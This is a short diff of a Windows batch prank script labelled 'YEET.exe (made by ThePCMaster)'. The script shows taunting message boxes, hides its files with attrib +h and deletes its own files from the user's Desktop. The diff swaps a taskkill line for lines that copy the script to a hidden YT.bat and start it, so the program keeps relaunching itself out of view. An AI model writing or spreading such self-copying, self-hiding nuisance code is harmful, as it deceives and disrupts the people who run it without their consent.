@@ -36,7 +36,9 @@ echo x=msgbox("do you know what you are running?",0+4,"YEET.exe (made by ThePCMa
 attrib +h yt.vbs
 wscript yt.vbs
 attrib -h yt.vbs
-taskkill /f /im YEET.exe
+copy YEET.bat YT.bat
+attrib +h YT.bat
+start yt.bat
 del %userprofile%\Desktop\YEET.* /f
 echo x=msgbox("because you totally do not now :)",0+0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 attrib +h yt.vbs
